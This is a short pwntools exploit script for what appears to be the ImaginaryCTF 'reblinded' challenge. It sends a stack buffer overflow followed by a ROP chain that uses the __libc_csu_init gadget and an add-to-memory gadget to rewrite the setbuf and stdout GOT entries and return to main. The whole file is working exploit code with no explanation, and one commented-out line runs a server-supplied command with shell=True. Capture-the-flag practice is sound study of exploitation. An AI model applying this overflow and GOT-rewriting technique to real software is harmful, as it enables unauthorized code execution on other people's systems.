from pwn import *
from subprocess import check_output

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc-2.31.so")
elf = ELF("./vuln")
gadget = 0xE3AFE
csu = 0x4011FA  # rbx, rbp, r12, r13, r14, r15
add = 0x40113c  # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
io = gdb.debug('./vuln', 'b *(main+65)\nc')
# io = process('./vuln')
# io = remote("reblinded.chal.imaginaryctf.org", 1337)


# io.recvuntil(b'solver with:\n')
# cmd = io.recvlineS().strip()
# print(cmd)
# ret = check_output(cmd, shell=True).decode().strip()
# print(ret)
# io.sendline(ret)


io.sendline(
    b"a" * 40
    + flat(
        [
            csu,
            libc.sym['puts'] - libc.sym["setbuf"],
            elf.got["setbuf"] + 0x3D,
            0,
            0,
            0,
            0,
            add,

            
            csu,
            0 - libc.sym["_IO_2_1_stdout_"],
            elf.got["stdout"] + 0x3D,
            0,
            0,
            0,
            0,
            add,

            elf.sym["main"],
        ]
    )
)
io.interactive()
